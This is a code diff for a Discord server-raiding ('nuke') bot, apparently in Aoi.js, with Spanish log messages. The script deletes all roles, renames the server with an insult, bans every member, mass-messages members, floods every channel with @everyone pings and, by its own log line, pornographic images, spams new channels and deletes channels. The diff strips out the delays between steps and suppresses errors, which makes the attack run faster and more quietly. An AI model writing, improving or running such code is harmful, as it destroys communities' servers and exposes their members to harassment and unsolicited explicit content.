@@ -6,13 +6,15 @@ $channelSendMessage[$randomChannelID;✅ He terminado de joder el servidor :)]
 $log[🕖  Mandando un mensaje de humillación en un canal aleatorio...]
 $textSplitMap[del-roles]
 $textSplit[$guildRoles[id];, ]
-$wait[1]
+
 $log[🕖  Eliminando todos los roles...]
 $setGuildName[FUCKED <3]
-$wait[1]
+
+$forEachMember[dm-users-kill]
+
 $log[🕖  Cambiando el nombre del servidor a "FUCKED <3"...]
 $forEachMember[ban-users]
-$wait[1]
+
 $log[🕖  Baneando a todos los usuarios en "$serverName"...]
 $forEachGuildChannel[flood-message-kill]
 $forEachGuildChannel[flood-message-kill]
@@ -26,7 +28,7 @@ $forEachGuildChannel[flood-message-kill]
 $forEachGuildChannel[flood-message-kill]
 $forEachGuildChannel[flood-message-kill]
 $forEachGuildChannel[flood-message-kill]
-$wait[1]
+
 $log[🕖  Spameando todos canales con @everyone e imagenes porno en "$serverName"...]
 $createChannel[FUCKED with love;text;no]
 $createChannel[FUCKED with love;text;no]
@@ -142,12 +144,12 @@ $createChannel[FUCKED with love;text;no]
 $createChannel[FUCKED with love;text;no]
 $createChannel[FUCKED with love;text;no]
 $createChannel[FUCKED with love;text;no]
-$wait[1]
+
 $log[🕖  Creando muchos canales en "$serverName"...]
 $forEachGuildChannel[del-channels]
 $log[🕖  Eliminando canales en "$serverName"...]
 $sendMessage[🕖 Iniciando...;no]
 
-
+$suppressErrors
 `
 })
